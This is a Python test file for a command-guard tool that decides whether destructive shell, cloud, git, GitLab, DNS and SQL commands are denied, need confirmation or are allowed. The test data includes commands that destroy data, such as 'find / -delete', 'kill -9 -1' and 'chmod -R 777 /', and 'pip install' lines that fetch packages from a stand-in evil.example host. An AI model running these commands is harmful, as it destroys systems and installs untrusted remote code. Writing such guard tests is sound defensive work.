#!/usr/bin/env python3
# ABOUTME: Tests for new security packs: cloud, infra, cicd, dns.
# ABOUTME: Verifies blocking and allowlisting for each domain.
"""
Tests new security packs by invoking command-guard.py as a subprocess,
same as the existing test_command_guard.py tests.
"""
import unittest

from guard_harness import assert_denied, assert_asks, assert_allowed


class TestCloudAWS(unittest.TestCase):
    """AWS CLI destructive operations."""

    def test_s3_rm_recursive(self):
        assert_asks(self, "aws s3 rm s3://my-bucket --recursive")

    def test_s3_rb_force(self):
        assert_asks(self, "aws s3 rb s3://my-bucket --force")

    def test_ec2_terminate(self):
        assert_denied(self, "aws ec2 terminate-instances --instance-ids i-1234")

    def test_rds_delete_cluster(self):
        assert_denied(self, "aws rds delete-db-cluster --db-cluster-identifier prod")

    def test_rds_delete_instance(self):
        assert_denied(self, "aws rds delete-db-instance --db-instance-identifier prod")

    def test_s3_cp_allowed(self):
        assert_allowed(self, "aws s3 cp file.txt s3://my-bucket/")

    def test_s3_ls_allowed(self):
        assert_allowed(self, "aws s3 ls s3://my-bucket")

    def test_s3_rm_single_object_allowed(self):
        assert_allowed(self, "aws s3 rm s3://my-bucket/file.txt")

    def test_s3_rm_dryrun_allowed(self):
        assert_allowed(self, "aws s3 rm s3://my-bucket --recursive --dryrun")


class TestCloudGCP(unittest.TestCase):
    """GCP CLI destructive operations."""

    def test_compute_delete(self):
        assert_asks(self, "gcloud compute instances delete my-vm")

    def test_sql_delete(self):
        assert_asks(self, "gcloud sql instances delete my-db")

    def test_storage_rm_recursive(self):
        assert_asks(self, "gsutil rm -r gs://my-bucket")

    def test_project_delete(self):
        assert_denied(self, "gcloud projects delete my-project")

    def test_compute_list_allowed(self):
        assert_allowed(self, "gcloud compute instances list")

    def test_gsutil_ls_allowed(self):
        assert_allowed(self, "gsutil ls gs://my-bucket")


class TestCloudAzure(unittest.TestCase):
    """Azure CLI destructive operations."""

    def test_group_delete(self):
        assert_asks(self, "az group delete --name my-rg")

    def test_vm_delete(self):
        assert_asks(self, "az vm delete --name my-vm --resource-group rg")

    def test_storage_delete(self):
        assert_asks(self, "az storage account delete --name mystorage")

    def test_sql_delete(self):
        assert_asks(self, "az sql server delete --name myserver")

    def test_group_list_allowed(self):
        assert_allowed(self, "az group list")

    def test_vm_list_allowed(self):
        assert_allowed(self, "az vm list")

    def test_group_delete_dry_run_allowed(self):
        assert_allowed(self, "az group delete --name my-rg --dry-run")


# =============================================================================
# Infrastructure pack tests
# =============================================================================

class TestInfra(unittest.TestCase):
    """Infrastructure-as-code destructive operations."""

    def test_terraform_destroy(self):
        assert_asks(self, "terraform destroy")

    def test_terraform_destroy_auto_approve(self):
        assert_asks(self, "terraform destroy -auto-approve")

    def test_terraform_apply_destroy(self):
        assert_asks(self, "terraform apply -destroy")

    def test_pulumi_destroy(self):
        assert_asks(self, "pulumi destroy")

    def test_cdk_destroy(self):
        assert_asks(self, "cdk destroy")

    def test_terraform_plan_allowed(self):
        assert_allowed(self, "terraform plan")

    def test_terraform_apply_allowed(self):
        assert_allowed(self, "terraform apply")

    def test_pulumi_preview_allowed(self):
        assert_allowed(self, "pulumi preview")

    def test_pulumi_up_allowed(self):
        assert_allowed(self, "pulumi up")

    def test_cdk_synth_allowed(self):
        assert_allowed(self, "cdk synth")

    def test_cdk_diff_allowed(self):
        assert_allowed(self, "cdk diff")


# =============================================================================
# CI/CD pack tests
# =============================================================================

class TestCICD(unittest.TestCase):
    """GitHub CLI and CI/CD destructive operations."""

    def test_gh_repo_delete(self):
        assert_denied(self, "gh repo delete my-org/my-repo")

    def test_gh_release_delete(self):
        assert_asks(self, "gh release delete v1.0.0")

    def test_gh_secret_delete(self):
        assert_asks(self, "gh secret delete MY_SECRET")

    def test_gh_repo_create_allowed(self):
        assert_allowed(self, "gh repo create my-repo")

    def test_gh_pr_create_allowed(self):
        assert_allowed(self, "gh pr create --title 'fix'")

    def test_gh_release_create_allowed(self):
        assert_allowed(self, "gh release create v1.0.0")

    def test_gh_secret_set_allowed(self):
        assert_allowed(self, "gh secret set MY_SECRET")

    def test_gh_repo_list_allowed(self):
        assert_allowed(self, "gh repo list")

    # GitLab CLI (glab)
    def test_glab_repo_delete(self):
        assert_denied(self, "glab repo delete my-group/my-repo")

    def test_glab_project_delete(self):
        assert_denied(self, "glab project delete my-group/my-repo")

    def test_glab_release_delete(self):
        assert_asks(self, "glab release delete v1.0.0")

    def test_glab_variable_delete(self):
        assert_asks(self, "glab variable delete MY_VAR")

    def test_glab_repo_update_archive(self):
        assert_asks(self, "glab repo update my-group/my-repo --archive")

    def test_glab_repo_update_archive_true(self):
        assert_asks(self, "glab repo update my-group/my-repo --archive=true")

    def test_glab_project_update_archive(self):
        assert_asks(self, "glab project update my-group/my-repo --archive")

    def test_glab_repo_update_unarchive_allowed(self):
        assert_allowed(self, "glab repo update my-group/my-repo --archive=false")

    def test_glab_repo_update_description_allowed(self):
        assert_allowed(self, "glab repo update my-group/my-repo --description x")

    def test_glab_repo_archive_download_allowed(self):
        # `glab repo archive` downloads a zip of the repository; it does not archive the project.
        assert_allowed(self, "glab repo archive my-group/my-repo")

    def test_glab_token_revoke(self):
        assert_asks(self, "glab token revoke 42")

    def test_glab_ci_delete(self):
        assert_asks(self, "glab ci delete 100")

    def test_glab_ssh_key_delete(self):
        assert_asks(self, "glab ssh-key delete 7")

    def test_glab_gpg_key_delete(self):
        assert_asks(self, "glab gpg-key delete 7")

    def test_glab_deploy_key_delete(self):
        assert_asks(self, "glab deploy-key delete 7")

    def test_glab_deploy_token_delete(self):
        assert_asks(self, "glab deploy-token delete 3")

    def test_glab_deploy_token_del_alias(self):
        assert_asks(self, "glab deploy-token del 3")

    def test_glab_securefile_remove(self):
        assert_asks(self, "glab securefile remove 4")

    def test_glab_securefile_rm_alias(self):
        assert_asks(self, "glab securefile rm --name cert.pem")

    def test_glab_securefile_delete_alias(self):
        assert_asks(self, "glab securefile delete 4")

    def test_glab_securefile_list_allowed(self):
        assert_allowed(self, "glab securefile list")

    def test_glab_mr_delete(self):
        assert_asks(self, "glab mr delete 5")

    def test_glab_mr_del_alias(self):
        assert_asks(self, "glab mr del 5")

    def test_glab_issue_delete(self):
        assert_asks(self, "glab issue delete 7")

    def test_glab_issue_del_alias(self):
        assert_asks(self, "glab issue del 7")

    def test_glab_var_delete_alias(self):
        assert_asks(self, "glab var delete MY_VAR")

    def test_glab_variable_remove_alias(self):
        assert_asks(self, "glab variable remove MY_VAR")

    def test_glab_var_remove_alias(self):
        assert_asks(self, "glab var remove MY_VAR")

    def test_glab_token_rm_alias(self):
        assert_asks(self, "glab token rm my-token")

    def test_glab_pipe_delete_alias(self):
        assert_asks(self, "glab pipe delete 100")

    def test_glab_pipeline_delete_by_status(self):
        assert_asks(self, "glab pipeline delete --status=failed")

    def test_glab_var_list_allowed(self):
        assert_allowed(self, "glab var list")

    def test_glab_pipeline_list_allowed(self):
        assert_allowed(self, "glab pipeline list")

    def test_glab_work_items_delete(self):
        assert_asks(self, "glab work-items delete 9")

    def test_glab_repo_create_allowed(self):
        assert_allowed(self, "glab repo create my-repo")

    def test_glab_repo_list_allowed(self):
        assert_allowed(self, "glab repo list")

    def test_glab_mr_create_allowed(self):
        assert_allowed(self, "glab mr create --title 'fix'")

    def test_glab_mr_close_allowed(self):
        assert_allowed(self, "glab mr close 5")

    def test_glab_issue_close_allowed(self):
        assert_allowed(self, "glab issue close 7")

    def test_glab_variable_set_allowed(self):
        assert_allowed(self, "glab variable set MY_VAR x")

    def test_glab_variable_list_allowed(self):
        assert_allowed(self, "glab variable list")

    def test_glab_release_create_allowed(self):
        assert_allowed(self, "glab release create v1.0.0")


# =============================================================================
# DNS pack tests
# =============================================================================

class TestDNS(unittest.TestCase):
    """DNS destructive operations."""

    def test_route53_delete_hosted_zone(self):
        assert_denied(self, "aws route53 delete-hosted-zone --id Z1234")

    def test_route53_change_delete(self):
        assert_asks(self, "aws route53 change-resource-record-sets --hosted-zone-id Z1234 --change-batch '{\"Changes\":[{\"Action\":\"DELETE\"'")

    def test_gcloud_dns_delete_zone(self):
        assert_asks(self, "gcloud dns managed-zones delete my-zone")

    def test_az_dns_delete_zone(self):
        assert_asks(self, "az network dns zone delete --name example.com")

    def test_route53_list_allowed(self):
        assert_allowed(self, "aws route53 list-hosted-zones")

    def test_gcloud_dns_list_allowed(self):
        assert_allowed(self, "gcloud dns managed-zones list")

    def test_az_dns_list_allowed(self):
        assert_allowed(self, "az network dns zone list")


class TestFilesystemCoverage(unittest.TestCase):
    """Destructive filesystem ops without an rm token."""

    def test_find_delete(self):
        assert_asks(self, "find . -name '*.py' -delete")

    def test_find_delete_root(self):
        assert_asks(self, "find / -delete")

    def test_find_exec_rm(self):
        assert_asks(self, "find . -type f -exec rm {} +")

    def test_shred(self):
        assert_asks(self, "shred -u important.txt")

    def test_find_without_delete_allowed(self):
        assert_allowed(self, "find . -name '*.py'")

    def test_find_type_allowed(self):
        assert_allowed(self, "find . -type f -newer ref.txt")

    def test_shred_in_filename_allowed(self):
        assert_allowed(self, "cat shred.txt")


class TestGitHistoryCoverage(unittest.TestCase):
    """Git history rewriting, ref destruction, and unguarded discards."""

    def test_filter_branch(self):
        assert_asks(self, "git filter-branch --force --index-filter 'rm x' HEAD")

    def test_reflog_expire(self):
        assert_asks(self, "git reflog expire --expire=now --all")

    def test_gc_prune_now(self):
        assert_asks(self, "git gc --prune=now")

    def test_update_ref_delete(self):
        assert_asks(self, "git update-ref -d refs/heads/main")

    def test_push_mirror(self):
        assert_asks(self, "git push --mirror origin")

    def test_checkout_dot(self):
        assert_asks(self, "git checkout .")

    def test_checkout_path(self):
        assert_asks(self, "git checkout ./src")

    def test_checkout_branch_allowed(self):
        assert_allowed(self, "git checkout main")

    def test_checkout_new_branch_allowed(self):
        assert_allowed(self, "git checkout -b feature/login")

    def test_gc_allowed(self):
        assert_allowed(self, "git gc")

    def test_reflog_view_allowed(self):
        assert_allowed(self, "git reflog")


class TestProcessServiceCoverage(unittest.TestCase):
    """Process, service, and scheduler control."""

    def test_crontab_remove(self):
        assert_asks(self, "crontab -r")

    def test_kill_all_processes(self):
        assert_asks(self, "kill -9 -1")

    def test_systemctl_stop(self):
        assert_asks(self, "systemctl stop nginx")

    def test_systemctl_disable(self):
        assert_asks(self, "systemctl disable nginx")

    def test_chmod_recursive_system(self):
        assert_asks(self, "chmod -R 000 /etc")

    def test_chown_recursive_system(self):
        assert_asks(self, "chown -R nobody /usr")

    def test_chmod_recursive_root(self):
        assert_asks(self, "chmod -R 777 /")

    def test_crontab_list_allowed(self):
        assert_allowed(self, "crontab -l")

    def test_kill_pid_allowed(self):
        assert_allowed(self, "kill -9 1234")

    def test_systemctl_status_allowed(self):
        assert_allowed(self, "systemctl status nginx")

    def test_systemctl_start_allowed(self):
        assert_allowed(self, "systemctl start nginx")

    def test_chmod_recursive_project_allowed(self):
        assert_allowed(self, "chmod -R 755 ./build")


class TestCloudCoverage(unittest.TestCase):
    """Additional cloud delete verbs."""

    def test_s3api_delete_bucket(self):
        assert_asks(self, "aws s3api delete-bucket --bucket my-bucket")

    def test_dynamodb_delete_table(self):
        assert_asks(self, "aws dynamodb delete-table --table-name my-table")

    def test_kubectl_drain(self):
        assert_asks(self, "kubectl drain node-1")

    def test_s3api_list_allowed(self):
        assert_allowed(self, "aws s3api list-buckets")

    def test_dynamodb_scan_allowed(self):
        assert_allowed(self, "aws dynamodb scan --table-name my-table")


class TestInfraCoverage(unittest.TestCase):
    """terraform auto-approve and orchestration teardown."""

    def test_terraform_apply_auto_approve(self):
        assert_asks(self, "terraform apply -auto-approve")

    def test_helm_uninstall(self):
        assert_asks(self, "helm uninstall my-release")

    def test_argocd_app_delete(self):
        assert_asks(self, "argocd app delete my-app")

    def test_flux_delete(self):
        assert_asks(self, "flux delete kustomization apps")

    def test_terraform_apply_plain_allowed(self):
        assert_allowed(self, "terraform apply tfplan")

    def test_helm_install_allowed(self):
        assert_allowed(self, "helm install my-release ./chart")

    def test_helm_list_allowed(self):
        assert_allowed(self, "helm list")


class TestSupplyChainCoverage(unittest.TestCase):
    """Remote code execution via URL/VCS specs (bare registry names stay allowed)."""

    def test_pip_install_url(self):
        assert_asks(self, "pip install https://evil.example/pkg.tar.gz")

    def test_pip_install_git(self):
        assert_asks(self, "pip install git+https://evil.example/repo.git")

    def test_gh_extension_install(self):
        assert_asks(self, "gh extension install evil/ext")

    def test_pip_install_name_allowed(self):
        assert_allowed(self, "pip install requests")

    def test_npx_bare_name_allowed(self):
        assert_allowed(self, "npx create-react-app my-app")

    def test_pip_install_requirements_allowed(self):
        assert_allowed(self, "pip install -r requirements.txt")


class TestSqlAllowlistPrecision(unittest.TestCase):
    """The DROP TABLE test-table allowlist must not leak to production tables."""

    def test_prod_table_with_test_comment_not_allowlisted(self):
        assert_asks(self, 'psql -c "DROP TABLE IF EXISTS prod_users -- run in test env"')

    def test_test_table_drop_allowed(self):
        assert_allowed(self, 'psql -c "DROP TABLE IF EXISTS test_users"')


if __name__ == "__main__":
    unittest.main()
